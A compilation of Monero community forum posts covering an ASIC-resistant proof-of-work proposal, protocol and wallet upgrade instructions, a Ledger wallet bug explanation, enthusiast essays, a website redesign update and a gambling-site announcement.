P.S. A note on fees blog can be found here:

"All over crypto you hear how blockchains will give the power back to the people but left and right we see developers and their ""supporters"" sell out for their ""moon Lambos"" but not here. Here you find the vision still alive. From forking asics to privacy and everything in between I'm very very happy to have this coin with us. Keep up the work guys! "
"We've had a lot of discussion of PoW and ASIC-resistance over the past couple months. I wanted to consolidate it all into one place for easier review.

The CryptoNote developers explicitly talked about this in the CryptoNote white paper. (In short, it's bad for network security if cheap ASICs exist that are more powerful than GPUs and high end CPUs.) Writing in 2013, it was already obvious that Bitcoin's SHA256 PoW was broken. They designed CryptoNight to address shortcomings in Bitcoin's PoW algorithm but unfortunately, as time has revealed, their analysis of why Bitcoin's PoW is weak and what makes a good PoW algorithm fell short.

The fundamental flaw that these guys all overlooked is that Proof of Work involves two distinct elements and both Bitcoin and CryptoNote tried to address both requirements with a single algorithm. I.e., there is the actual *work* that must be done, and there is the *proof* that the work was performed. Both Bitcoin and CryptoNote used cryptographic hashes to address both requirements, but cryptohashes are only good for *proof* - they're used in digital signatures to verify that some piece of data is authentic. But that's all they're good for.

Cryptographic hashes are intentionally designed to be efficient to implement and fast to execute. They're designed to be lightweight and high throughput. But the Work you need to secure a network must be *hard*. Cryptographic hashes are trivially easy to implement in hardware because they use a simple set of operations, sequenced in a straightforward order. They're the ideal algorithms for ASIC implementation.

People overlook this aspect of hardness all the time. They think ""Bitcoin is secured by trillions of hashes/sec, so of course it's secure"" - but that's not automatically true. *Work* is what secures the network, and that means *energy* - electrical energy, in this case. The hash rate is only a proxy for work, and it's a poor one at best. E.g. if you have a network secured by 1 trillion SHA256 hashes/sec at a cost of 1 microwatt per hash or a network secured by 10 billion Argon2 hashes/sec at a cost of 1 watt per hash, the Argon2 network is actually more secure.

A viable PoW algorithm has to be computationally hard. Not just ""memory hard"" as CryptoNight claimed - memory densities double every 18 months. But transistor *speeds* have flatlined. So this is the first hint - you need something that's actually difficult to compute. Cryptohashes are easy to compute; they're intentionally designed to be easy.

ASICs and GPUs outrun CPUs because they have hundreds or thousands of small/simple compute nodes running in parallel. The more complicated the computation, the larger a compute node you need to successfully execute it - which means, the more expensive the ASIC, and the fewer compute nodes can fit on a chip. So again, we're aiming for computational complexity. More to the point - we're aiming for algorithms that leverage the general-purpose design of CPUs.

ASICs are fast because they're hardwired to do a single task. CPUs are slow because they're general purpose - instead of being hardwired for any particular function, they read and interpret a list of instructions that tell them which function to perform. So the obvious way to put the brakes on ASICs is to force them to do more than a single task.

A few multi-algorithm PoW systems have already been designed - they all still fail because the individual algorithms are still cryptohashes, and each one is still easy to implement. If your PoW uses 12 different hash algorithms, big deal, they just design an ASIC with all 12 algorithms on-chip.

The way forward as I see it is to use a PoW with completely randomly generated code, so that it's impossible for an ASIC to hardwire all of the algorithms. At that point the ASIC folks will be required to build an actual CPU into their chips. And that will bring their speed back down to earth.

Note that their on-chip CPU still doesn't need to be as full-featured as a regular CPU, and the simpler they can make it, the cheaper it is to build and the faster it will run. So it's important that the randomly generated code is also inherently complex, using a wide variety of operations and data types. It's also important that the code uses a stable and mature programming language. Something that's too new and experimental may have many holes waiting to be discovered, or unexpected optimizations that allow some implementations to have unfair advantage.

The PRNG used to randomize the code needs to be of high quality, so that it doesn't frequently produce repeated sequences. Anything that occurs frequently can be condensed into a hardware circuit.

My approach, based on this knowledge, is to generate random Javascript. The PRNG I've used is an optimized variant of Mersenne Twister. This PRNG is not a cryptographically secure generator but it doesn't need to be. On the other hand, it has been heavily studied and heavily optimized over many years so it's unlikely for anyone to develop any shortcuts in implementing it.

I've chosen to use Javascript because it's a mature language and there are a number of competing Javascript engines out there, all heavily optimized. The likelihood of significant new optimizations being discovered is low. (And there's a side-benefit - if anyone *does* discover a new optimization, it may benefit the entire computing community.)

A running proof of concept is available on my github page github.com/hyc/randprog

The blockhashing blob + nonce are fed in as the seed that initializes the PRNG. (Just like in CryptoNight, it's first run thru Keccak, to ensure the bits of the nonce are evenly distributed across the seed.) The source code of the generated program, as well as the output of the generated program, are crunched with Keccak and one of 4 randomly selected hash algorithms (Blake256, Groestl, JH, and Skein) just like CryptoNight. Using the cryptohashes proves that a piece of work is authentic - the hashes will not match if the wrong source code was generated, or it wasn't executed correctly. But aside from proving authenticity, the cryptohashes play no other role.

**Note that this is a scheduled and consensual protocol upgrade. Thus, unlike the BCH / BTC split, a new coin *won't* be created.**

-------------

Approximately the 15th of September there will be a scheduled protocol upgrade on the Monero network. Most pools have upgraded or are in the process of upgrading, but some have not upgraded yet. If they don't upgrade before the scheduled protocol upgrade they will get booted off the network. As a result you will miss out on revenue if you are mining on these pools. Thus, if you are mining on one of the pools that hasn't upgraded yet or hasn't scheduled an upgrade, please contact your pool owner as soon as possible and urge them to upgrade. Alternatively, you can switch to a pool that is on the right version.

#**An important message for pool operators and miners**

Bear in mind that running CLI v0.11.0.0 or GUI v0.11.0.0 is mandatory. Any other versions will get booted off the network. Thus, miners, please email your pools and ask them if they are running v0.11.0.0. In addition, pool operators need to ensure that payouts use a minimum ring size of 5 (mixin 4), otherwise they will get rejected by the network. 

#**General scheduled protocol upgrade information**

The scheduled protocol upgrade was introduced to enforce RingCT transactions and to bump the minimum ring size to 5 (mixin 4). Note that, after this scheduled protocol upgrade, you are still able to transform non RingCT outputs to RingCT outputs in a ""one-time"" transaction. Thus, you **don't** need to sweep a paper wallet if it contains non RingCT outputs. 

Due to variance the scheduled protocol upgrade will take place on or around the 15th of September. There is, however, no specific date as the hard fork will be triggered by a specific blockheight. The specific blockheight for the hardfork can be found [here](https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L105). That is:

> // version 6 starts from block 1400000, which is on or around the 16th of September, 2017. Fork time finalised on 2017-08-18.

**As an user you need to run either CLI v0.11.0.0 or GUI v0.11.0.0.**

#**How do I upgrade?**

**CLI:**

If you are using the CLI you ought to perform the following steps:

1. Download the new binaries from [here](https://getmonero.org/downloads/).

2. Extract the new binaries to a new directory of your liking.

3. Copy over the wallet files from the old directory (the one that contains the v0.10.3.1 binaries).

Note that a blockchain resync is **not** needed. If you open `monerod-v.0.11.0.0` it simply picks up where it left off.

**GUI:**

If you are using the GUI you ought to perform the following steps:

1. Download the new binaries from [here](https://getmonero.org/downloads/).

2. Extract the new binaries to a new directory of your liking.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled protocol upgrade. 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script.  

**Paper wallet:**

You don't have to do anything :) However, if you want to restore a wallet after the scheduled protocol upgrade, you need to use the new binaries. 

**MyMonero**

You don't have to do anything, as MyMonero will be properly upgraded in advance of the scheduled protocol upgrade.

**Solo mining:**

This process is similar to the CLI upgrade process. Thus, see aforementioned steps.

**Pool mining:**

Only your pool operator needs to upgrade to the new version. In addition, any mining software that you use doesn't require an upgrade.

"A few weeks ago some Ledger Monero users got affected by a bug in the Ledger Monero code. Due to the bug, a handful of transactions were erroneously constructed and the wallet was not able to spot (and subsequently credit) the change, thereby letting the user believe their funds were lost. Fortunately, we were, in collaboration with the Ledger team, able to resolve this bug and recover the 'lost' funds of the affected users.

Monero uses two different transaction public key formats. The first format is utilized when a transaction is sent from a main address (the addresses that start with a 4) to a main address, whereas the second format is utilized when a transaction is sent from either a main address or a subaddress (the addresses that start with an 8) to a subaddress. The formats can be denoted as follows:

**Format 1:** R = rG

**Format 2:** R' = sB 

Where:

- r = the private transaction key
- R = the public transaction key
- G = the Ed25519 base point 
- s = additional private transaction key in case of subaddresses
- R' = public transaction key in case of subaddresses 
- B = the public spend key of the recipient 

The shared secret can then be denoted as follows:

**Format 1:** rA = aR

**Format 2:** sA = aR'

Where:

- a = the private view key of the recipient
- A = the public view key of the recipient

The bug was essentially that the Ledger Monero code used the first transaction public key format, whereas it should have used the second one. Therefore, the wallet was not be able to decode the change output, because it expected a different format of the shared secret. That is:

**Expected:** rA = aR

**Actual:** rA = aR' 

Thus, the wallet was not be able to spot the change and could not credit it to the balance. The bug was investigated by Ledger and described to both luigi1111 and stoffu. Fortunately, luigi1111 designed a concept that would allow one to retrieve the lost funds. Subsequently, stoffu created the required manual patch (that can be seen [here](https://github.com/stoffu/monero/commits/ledger-rescue2). Lastly, the Ledger team assisted the affected users with retrieving their funds.

Going forward, pull requests related to the Ledger Monero code will receive additional scrutiny, review, and testing. Additionally, extensive tests ([similar to the ones for Trezor](https://github.com/monero-project/monero/pull/4977)) will probably be added to the code. This, hopefully, will ensure no such bugs will be present in the future."
"My thoughts and observations on XMR:


I have been following cryptocurrencies since 2010; however I did not have the requisite computer literacy at the time to effectively understand and use them. Several years ago, I bought a small amount of Bitcoin, but did not truly pusue it.  Recently, I resolved to become sufficiently computer savvy. After months of self-study, I decided to test my skills with a desktop home build, to feed my gaming addiction. A friend of mine suggested I should mine Monero while the rig was idle. I had only heard of Monero as 1 of 1000 altcoins.  I was intrigued by XMR's CPU minability, something I thought no longer existed in the cryptosphere. I've been mining ever since. (My rig sports an i7-6700K CPU and dual GTX 1070's.) I started mining in December of last year. I'm a hobbyist miner, nothing more, but I can say that mining has had a psychological effect on me. I follow the story of Monero with an excitement that my Bitcoin purchase never brought me.  Perhaps this is because mining is an ongoing process instead of a single accumulation event. Here is a summary of what drew me to Monero, what it has already accomplished, where I think it needs to go, and what I think some of its most special features are.  As a zealous convert from Bitcoin, I can't help but think of BTC as a foil for XMR. 


First and foremost, I was drawn to Monero due to it's ability to be feasibly mined on both CPUs and GPUs. I like the idea of being able to put idled pieces of technology to work; old phones and computers could be utilized to mine. ASICs are expensive, closely tied to the price of the coin they mine, and provide no other utility to my life. CPUs and GPUs are a less risky investment, because they have utility and value independent of crypto mining.  When I joined the Monero revolution, hardware wallets were not available yet; this means there was also an opportunity to use truly ancient tech as an air gapped wallet, allowing me to even utilize machines that were uneconomic to mine with. I have always been a sort of scrap-oriented hacker, and I take pride in mining on computers and phones that I have assembled, upgraded, or refurbished myself. This is an experience that cannot be replicated by plugging in an ASIC; one of the biggest things that drew me to Monero was the dev team's commitment to mining on consumer technology. My faith in the project was affirmed by the recent PoW change.


The second major factor that drew me to Monero related to the (in my opinion) greater utility of the address format and mnemonic seed, as compared to Bitcoin. I've always felt that BTC's mnemonic seeds and HD wallets were sort of grafted on to the underlying protocol. As an example, not all HD wallet seeds are compatible; you need to be running a program (such as Electrum) that works with that seed.  In Monero, the mnemonic seed was considered from the beginning, and integrated into the core client. We can carry our XMR seeds across platform without worry.  If memory serves correctly, GUI seeds can be used in Monerujo and MyMonero.  I've been told they work with Cakewallet as well. This a great convenience I think we often overlook.  


I feel like my next point is somewhat related to the above point; we do not have to hassle with xpubs. Using xpubs means you need to give out a new address every transaction, or deal with the consequences of address reuse. Monero's automatic stealth address integration not only addresses some of these drawbacks, but it also offers the convenience of only having to copy a QR code once. Your XMR address never changes, so it's a lot more convenient to have something like a donation address or pre-printed QR codes, for example.  

Another feature of XMR that I think sets it apart is it's tail emission; surprisingly few coins have it.  Not only does a tail emission incentivizes mining indefinitely, it also replenishes the coin supply.  Coins will inevitably be lost over time as people die or lose their seeds; in the long term this could result in volitility due to a lack of liquidity, which is detrimental to the whole crytpo ecosystem.  I think Monero's conservative tail emission is forward thinking in that respect.  Enough coins will be replaced to ensure ongoing mining as well as general liquidity.


Thus far, I haven't even mentioned the privacy aspects. Ring Signatures, Ring CT, and Stealth Addresses all work together to give Monero users a great degree of privacy.  These are great features that would have drawn me to hold the coin, even if they didn't pique my interest to mine it.


There can still be improvements on this front, and in fact there have been and there will continue to be.  Minimum Mixins have been increasing, improving plausible deniability.  Subaddresses give Monero users the ability to utilize multiple receive addresses, gaining some of the advantages of BTC's xpubs.  Bulletproofs are coming, increasing the efficiency of Monero's cryptography.  Kovri is coming, not just for the official GUI wallet but hopefully also for mining pools as well.


There have been other recent innovations as well such as multi-signature transactions which allow Monero to take advantage of escrow abilities. The ecosystem around the blockchain has grown as well, notably in the realm of hardware wallets.  The use of Monero will likely soar as a result of these new augmentations.


Here are some of the developments I have witnessed in my short time as a part of this community:


(1) Multi-signature Support

(2) Subaddress Generation

(3) Hardware Wallet Support

(4) Anti-ASIC PoW Change

(5) Mixin Size Increase


Here's what I am looking forward to as catalysts:


(1) Kovri integration

(2) Mobile hardware wallet support via Monerujo

(3) Monero as a Debian package integrated into Tails OS

(4) Bulletproof transaction size reduction

Continuing PoW forks to combat ASICs

(5) XMR adoption as base currency on Bisq


These factors are what galvanize my belief that Monero will only increase in utility over time.  XMR has lost over half it's value since I started mining, and I can't but help to see it as an opportunity.  XMR is only getting steadily better than Bitcoin; parity may be closer than we think. 


There is only one major roadblock to adoption, in my mind, and I believe it is an inevitable consequence of our encrypted blockchain.  Frankly, making a view-only wallet is a cumbersome pain.  The private view key only lets you see incoming transactions, so you need to import the signed key images from another machine.  This is a much more painstaking process than simply exporting a Bitcoin xpub.  Thankfully, hardware wallets can be a solution to this problem, as a means of providing access to private keys and key images.  Technical difficulties are quickly melting away, priming to release Monero's revolutionary potential.  Monero is my dream coin, embodying what I feel are all the central tenants of the original cypherpunk cryptocurrency movement.


What else are you looking forward to in the future of Monero? Does anyone else share my sense of giddyness for the future?

"Yo people. Really. [Read this post](https://www.reddit.com/r/Monero/comments/7dufk0/did_roger_ver_just_move_all_his_monero_to_an/). It's making a point about Monero. Awesome stuff. Now read the comments.

Guys. Let me say this plainly. Nobody cares about your stance on the BTC/BCH thing. There are plenty of places to discuss this. This subreddit is not one of them. Talk about Bitcoin is generally allowed when it relates back to Monero in some way (i.e. how we can learn from what they did wrong or right and stuff), but the zealots bleeding over here and making a stink because people disagree with their viewpoint is not acceptable.

People have different ideas of how to solve scaling. It doesn't make them villains for having different ideas. I know both sides are deluded into thinking that their side is squeaky clean, and the other side is full of villains. If you want to think that way, that's fine. It's your right. BUT KEEP IT OUT OF HERE!

Think I'm just trying to be a jerk? It's in the sidebar. No zealotry. Look at it if you don't believe me. 

Monero WILL have divisive issues in our future. Maybe scaling, maybe not. But we CANNOT let what happened to the Bitcoin community happen to us. Take your zealotry elsewhere. We don't want it here."

"Above game theory there is a formalized branch of mathematics known as-  
  
#Game Design Theory  
  
Well there isn't to my knowledge, but there totally should be.  Anyway, game theory attempts to phrase all mutually complex interactions with formal mathematical descriptions... Whereas game design theory formally defines various games that one could design, with the end goal being to create the most attractive and compelling games to a perfectly rational participant.  Humans are rarely rational creatures so the proper effects of this can usually only be seen on very large (i.e. planetary) scales. 
 
Language is a good example of good game design theory winning out.  Religion was another.  Government yet another.  The best languages and religions that we invented as a growing species were ones that followed certain patterns and had certain qualities.  These grew organically as their development was too complex for a single human to author.  Note that I didn't say any of these 'game systems' were perfect, just good enough that they provided the average participant a benefit that organisms outside the game did not have... Which was enough to ensure the games' continued existence and success on the meta-civilization scale.  
  
Though there were many languages, Latin based systems won out (amid other possibilities) due to certain egalitarian qualities at their base layer, allowing the average player to enjoy a huge number of benefits, even when interacting with someone much already fluent. 
 
Consider religion too - though many consider it a great evil of our society, and though true that many horrors have been committed in the name of religion, it was an important social glue for civilization for many aeons.  The best religions were the ones which allowed anyone to achieve a high degree of divinity and were easily accessible.  They were games that fed off certain human needs, and they provided their players with not only innate perks of playing (*""hey, no more worrying about what happens after death! it's actually gonna be okay... if you play our game!*"") but also they gave all players an equal platform and new type of language on which to exchange power, value, and affection.  (*""totes sending prayers boo!  miss uuuu💜💕💜💕✌️""*) 
 
I leave it to the reader's imagination how the most effective and viral forms of government were also the best designed 'games"". 
 
------------ 
 
*""Is this off topic?""*  
*""No, go fork yourself.* **You're** *off topic*"".  
  
Welcome to the new world of  
#Blockchains as a game  
  
They, like many marvelous new systems before them, are indeed abstract games.  And they were designed with certain principles at their core.  Let us call a game that gives an author a massive disproportionate advantage not just an asymmetrical game but an **asymptotic one**.  Such games correspond to early religions where one player was deemed the God Emperor and had powers and privileges that no other player could ever possess, no matter how hard they worked. 
 
New rational players, if given a choice, should never play such a broken game.  However for many earlier humans, they sadly didn't have a choice.  Threat of physical violence compelled them to endure such horrific games, and indeed the threat of physical violence is one of the chief tools to coerce unwilling participants to play your shitty design.  
   
*Now here is what I consider one of the greatest miracles in the history of civilization*: **The first true blockchain, Bitcoin, was a new type of game with true egalitarian rules at its outset**.  I have trouble thinking of other games which gave all willing participants such astounding equal opportunity, though democracy came pretty close.  Anyone could become a minter of this new currency, and the only advantage Satoshi (the 'author') had was that they knew about it before anyone else.  And even this advantage has been mitigated in the best way possible by ensuring the original tokens have never moved.  Such celestial-tier elegance of design is most assuredly beyond the comprehension of most humans.  
  
A good game gives equal possibility of victory to all participants, regardless of when or how they start playing.  Now, egalitarian doesn't mean equal.  Indeed, many of the benefits of a game system cannot exist when all players are forced to remain equal... Such a thing destroys the very concept of a game.  Nature will never be equal.  There will always be powerful and poor in a system.  However, in the best games even the poorest and newest players are still fundamentally playing the same game the author was.  
 
#Friends Don't Let Friends Play Bad Games 
 
The entire idea of an ICO is antithetical to the idea of a well designed game.  It immediately creates a line of insiders and outsiders (**power players vs. normals**) and ~~decimates~~ centimates (*a new word I just made up which means double-decimates*) the value proposition of a new blockchain. 
 
By people like Vitalik being a known entity which arbitrates and influences token assignment (which literally already happened after the DAO fiasco) and holds a titanic amount of value he spawned himself with (meaning he just started the game that way and didn't earn it fairly in equal competition with other players) it means Ethereum is a shitty designed game - the religious equivalent of ancient Egyptian theocracy. 
 
**Monero** on the other hand has done quite the opposite - allowed all players an equal chance to accrue tokens alongside the ongoing authors of the system.  No sole player is a God-master of this game system, as we saw when the original core dev thankfulforbae (close enough) got his ass pricked with a fork when he tried to position himself as such.  *Quality designed games always trump poor ones, in many cases even technically superior ones*. 
 
Fortunately we don't have to make such a distinction.  Monero is the most technically sophisticated blockchain on this planet.  And it is also an elegant and fair one from a game design theory standpoint. 
 
Don't play bad games.  By being part of a game system you are entering a powerful bond of communication and cooperation with your fellow players, one which if cultivated properly will allow you to socially and financially evolve exponentially faster than players stuck in broken systems.  There's a reason we don't have Egyptian God-kings anymore. 
 
You are apparently (you're reading this shit aren't you?) involved in the most advanced specimen of the most powerful game system ever created in this known universe.  Physics is a game too, but we just don't get to choose whether we want to play it.  Fortunately it's a good one since we all have a totally egalitarian set of rules we abide by.  Since blockchains are one of the games you actually get to *choose* your involvement in... Why would you ever willingly be part of an asymptotic one? 
 
Fuck ICOs.  Send them your prayers boo 💜🙏🙌 because they're gonna need them to pass along to their God-kings once the shit hits the fan.

A lot has been done since many of you have heard from me. Like. A lot. I have no idea where to begin. But gotta start somewhere, I guess.

**Getmonero.org Status**

[Updated test site](http://45.32.161.183/)

Check out the test site. Really. Things are updated from when it was last posted with the entirety of getmonero.org pages. They're not all working, because there's still work and tweaks to be done and custom pages to make, so not all the links are connected. Clicking around may get you to some 404s, but relax. We're still working. :)

Try everything out in mobile, on Tor, on tablets, and on anything else you can find!

The custom HTML/CSS framework has been completed and thoroughly tested and is working well on all browsers (including Tor). Sorry to brag, but there have been so many exciting things that I've been able to get Tor-friendly with zero javascript it's not even funny. 

Just as an example, the [tooltips on Moneropedia](https://getmonero.org/knowledge-base/moneropedia/base32-address) when you hover over certain words (hover over the word 'I2P' on the provided page) used to be done with Javascript, but in the new styling are [now done completely with CSS](http://45.32.161.183/resources/moneropedia/base32-address.html) so they will work with anyone who has javascript disabled. And there's lots more examples. It's thrilling really, and super fun!

So the pages that will remain basically the same are being ported. Regardless, the framework has been ported completely and is successful with a few kinks.

Some working sections of note are:

[Moneropedia](http://45.32.161.183/resources/moneropedia/) (you can click any of the articles as well). 

and

[Individual blog posts](http://45.32.161.183/2017/05/17/disclosure-of-a-major-bug-in-cryptonote-based-currencies.html) (that column on the side is going to be where others tags and recent posts will go).

Work continues along at a good pace. You can take a look at the planned page wires [here](http://imgur.com/a/O40eX).

**Other things of note:**

I'm working with a number of people to get graphics and icons up for the site. Primarily Savandra and mowwy. If you see them around. Give them a huge thanks.

**Copy & Guide Volunteers**

So, as the website continues, there arises a need for volunteers to help with copy. Copy is not in my contract, although I don't mind helping to write it when I have the time and am not working on the actual site. To make things easier for everyone, I've set up a [folder on my GitHub](https://github.com/rehrar/monero-site-framework/tree/master/copy) where people can help write the copy for the different pages. Please read the readme and get writing! There's lots to do, and more than enough for everyone.

Any and all help will be appreciated.

On that SAME note, on the current getmonero.org website are [User Guides](https://getmonero.org/knowledge-base/user-guides/) and [Developer Guides](https://getmonero.org/knowledge-base/developer-guides/). You may notice that there aren't many. YOU CAN HELP! :D

If anyone wants to help make Guides to flesh them out, that'd be great. They can even be sent into the current website, and the new styling will soon apply to them as well. Can always use more quality content.

**Kovri**

You thought we're done? Ha! Not yet. I've still got MORE to share.

So because for getmonero.org we made an entire HTML/CSS framework, and in light of the alpha release of Kovri coming sometime soon^TM , I decided to take some time and make utilize the framework to restyle the kovri website.

The current website is a complete port of the old one, but there are custom pages to be made, so be on the look out for a FFS soon after getmonero.org is complete, as Kovri is not in my current contract. :)

Depending on when you view this post, the [old styling](https://getkovri.org) may still be up. If it is, you can save your opinions on it because it's being replaced with this new styling which can be viewed on my [Kovri test site](http://45.32.171.42/). Click around. Test it out, and play with it on mobile and everything that I said above. As it stands, the pull request has been merged and we're just waiting on moving it from GitHub to the server, which I do not have access to. So it should be up very soon.

You may also notice another major thing on the Kovri site, this brings me to my next point.

**Multi-language**

I've used Kovri as a testing ground for multi-language support. I'm not paid to bring multi-language support to getmonero.org, but I've decided to poke around and see the Jekyll plugins available and get familiar with one of them for the future.

Kovri is has fully functional multi-lingual features (although at the moment all the other languages only take to a different page with English copy cuz I haven't translated), and if you would like to contribute to translating the website, I've put together a very [thorough document](https://github.com/anonimal/kovri-site/blob/master/Kovri%20Website%20Instructions.md) that takes you step-by-step through the process of translating pages.

Right now only Russian, Spanish, and English are added. If you would like another language added, please contact me and I'll get it done. It's a bit outside of the scope of the document that I wrote. I'll try to get it up ASAP so you can get cracking.

Depending on how this goes, we may be looking at making getmonero.org multi-lingual soon, although there are still some things to iron out with it. :)

**Closing thoughts:**

Man, I told you it was a lot, didn't I? I hope this update whets people's appetites for the things to come. There's lots of great stuff, and I'm excited to be a part of this privacy movement, called Monero. We're still moving forward. We're still getting stuff done. We're still the best. :)

As a last note, you may have noticed me say repeatedly that I'm not paid to do certain things that I'm doing anyways. I love Monero, and enjoy working on it, and will continue to do so in my free time, but if you feel so inclined to make a donation for the work that I'm doing for free, my XMR address is provided below (it would be very appreciated):

Thanks all, see you in the next update!"
"Since Bitcoin is completely transparent, those who own a lot of it, who don't need to sell it to buy things, who don't want to pay capital gains, will simply borrow money using their easily verifiable Bitcoin balance as collateral. This will be encouraged and will be structured in such a way to keep the banks in business. Our economy, legal system and tax system are already built on debt and fractional reserve debt money. The rich are encouraged to take out loans on assets rather than incur capital gains taxes. Such a system will keep a lid on the value of Bitcoin, just as it already does with gold.

Since Monero is private, those who own a lot if it will certainly not want to tell a banker how much they have and borrow against it. Moreover, it will be very difficult to collect capital gains taxes on Monero. So these holders will simply spend Monero, rather than borrow against it. The spending will increase the transaction pool and make Monero even more secure. 

I believe that Monero will be quietly accepted by the rich people who control the government and banking system as they need something like Monero for their own personal use. This assumes that there is not a viable alternative to Monero, and I certainly don't see one right now.

TLDR;  Bitcoin will be absorbed into the fractional reserve system. Monero won't.

"So it might always stay a ""small privacy sensitive community coin"".
Any counter arguments to this?
I think if we want Monero and privacy in general to flourish, we should actively spread knowlegde about privacy issues in our local communities without becoming too annoying.

Post your ideas how this could be achieved!
Personally I think simple, visually pleasing posters in commute could be very effective. With comparisons between everyday-small privacy examples (shutting your curtains in the evening, closing the toilet door etc).

Very simple like:
Poster: Evening, Silhouette of a woman changing for bed, outside a perv taking the chance to watch her undress
Text: ""You shut your curtains at home. Why don't you do the same for your financial privacy?""

Do we have any good graphic artists here? Would be awesome if we could get something like this going.

Another idea (don't know if it exists already): creating an app that shows all the cameras around you, giving you real time alerts how many cameras are watching you at that very moment. Goal would be to spread awareness and showing real life examples of how everything is being watched and controlled.

I'm sure this community has many more and even much better ideas, let us all know!"
"I saw some rbtc posts trolling about Monero and came over here.

This is my understanding: Fluffypony tweeted about a ""big announcement"" which would be happening at a meetup and then retweeted a couple other people saying they'd previewed the Big Announcement and it was indeed big.   Then the meetup happened and the Big Announcement was a lulzy video.

And now the subreddit is aflame with nasty, even threatening comments.

This doesn't follow.   Lots of people post build up for announcements that turn out to be not so much, this is normal.  Fluffypony has at every turn that I've seen behaved with integrity and intelligence.  His thoughtful manner has been an essential component in the bringing in the support (or at least tolerance!) from intelligent people elsewhere resulting in advancing Monero through things like RingCT and protecting Monero through things like the discovery of the recently disclosed key image small subgroup handling flaw.

If this subreddit's response reflects how the monero community handles a lame announcement, -- how would it handle something that was actually a big deal?  If this is how it is-- Why should anyone want to be involved with advancing the system?

I used to be a bit envious of the respect and cooperation Monero had.  Today I am not.

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from aforementioned download links. 

2. Extract the new binaries to a new directory / folder of your liking. This is the easiest and recommended way. 

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet^2.  

4. The following *only* applies if you're upgrading from v0.12:

> If you're running a local node, the integrated daemon (monerod) will first have to convert your database to a new version. This may take a few hours and the GUI may show that it's `Disconnected`. I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod). 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`

(2) If, for some reason, the GUI doesn't automatically load your old wallet, you can open it as follows:

**[1]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[2]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off. 

-------------------

# Brief release notes

- Fixes Ledger bug (wrong_sequence_idx)
- Fixes Mac OS X launch bug (openssl)
- Fixes incompatible wallet cache bug (error: std::bad_alloc | error: basic_string::_M_replace_aux)
- Fix a bug where the output distribution was cached (chain changes were ignored and thus the selection of decoy outputs was improper)
- Plug-and-play Ledger support for all operating systems
- Lots of bugfixes and performance improvements

**Note that, on Linux, you may have to apply this guide:**

[GUI / monerod v0.13.0.3 does not start on Linux because of “./monero-wallet-gui: error while loading shared libraries: libhidapi-libusb.so.0""](https://monero.stackexchange.com/questions/10361/gui-monerod-v0-13-0-3-does-not-start-on-linux-because-of-monero-wallet-gui/)

# Known issues

- The version number is stated as 0.13.0.3 on Mac OS X. The commit shown, however, is the commit of the tag. You can thus safely ignore this.
- Stop / Start Local Node buttons are buggy.
- `monero-wallet-gui.log` is written to the root of the disk (where it may not have write permissions). You can change the directory of the log file with the `--log-file` flag (which ought to be applied upon startup of the GUI). 
- ~~Download links on getmonero.org still point to GUI v0.13.0.3.~~ Fixed.

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero/releases/tag/v0.13.0.2).

2. Extract the new binaries to a new directory of your liking.  

3. Copy over the wallet files from the old directory (the one that contains the v0.12.0.0, v0.12.1.0, v0.12.2.0, or v0.12.3.0 binaries).  

4. Start `monerod` (warning: a database conversion is required, which can take hours or even a day to complete) and `monero-wallet-cli` (in case you have to use your wallet). 

Note that a blockchain resync is not needed. Thus, if you open `monerod-v.0.13.0.2`, it will simply pick up where it left off. Note, however, that the daemon (monerod) will have to upgrade the database version to accommodate the changes required for the initial pruning implementation.

**Note that, on Linux, you may have to apply this guide:**

[monerod v0.12.2.0 does not start on Linux because of “./monerod: error while loading shared libraries: libpcsclite.so.1”](https://monero.stackexchange.com/questions/8597/monerod-v0-12-2-0-does-not-start-on-linux-because-of-monerod-error-while-loa/)

"I don't know since when contributors were thinking to upgrade to remove ASICs from the network, but the transition seems so smooth and flawlessly executed. There was no backlash or any negativity from the community. We all stood strong together against ASICs and I wish we do the same forever. Now, just waiting for diff to come down.

I got into crypto last Nov and my first crypto is Monero. Monero is 20% of my portfolio and I'm going to increase it to 30% as I see Monero community is one of the best crypto communities AFAIK.

Love you, Monero. Love you, people!"
Whoo! Congratulations guys! What a milestone!
"#Introducing [https://minko.to](https://minko.to)   
   
&nbsp;
   
Monero's ability to provide privacy and fungibility is technically dependent on sufficient diverse (and even better, legal) usage taking place on the network. In short, the higher the number of varied transactions the happier and more secure we all are.   
   
I'm excited to introduce Minko, a social gambling platform that respects your privacy, aka a cool Monero game and the first of its kind. And hopefully, a fun way to raise donations for Monero development (see below). Bonus: it also provides a fun visualization of Monero transactions when you want to demonstrate the effectiveness of the network to newcomers.   
   
It is currently in Beta version, so it may be a bit rough around the edges. But we really wanted to release something fun for the anniversary, and feedback is more than welcome!   
   
*PS: the official reddit handle is /u/minko_to*   
*PSS: to avoid any ambiguity associated with my role: while this project aims to contribute donations to Monero development, it is not affiliated with the Core Team.*   
   
&nbsp;
   
##Donations to Monero development   
   
&nbsp;
   
The first month of profits will be donated entirely to the Monero general donation fund (you can donate any time there at [https://ww.getmonero.org/get-started/contributing](https://ww.getmonero.org/get-started/contributing)).   
   
If Minko is at a loss after a month (in case players are lucky), don't worry it's on us.   
   
We wish to keep financially contributing long term to Monero development and will define the best way forward after this first month (with more knowledge of what to expect in terms of traffic).   
   
&nbsp;
   
##Provable fairness / odds   
   
&nbsp;
   
The game is provably fair, all details are explained on the site. The odds are higher than 98.24% on each of the different colors. In other words, the house edge is smaller than 1.76%.   
   
&nbsp;

"Hello Monero Community!

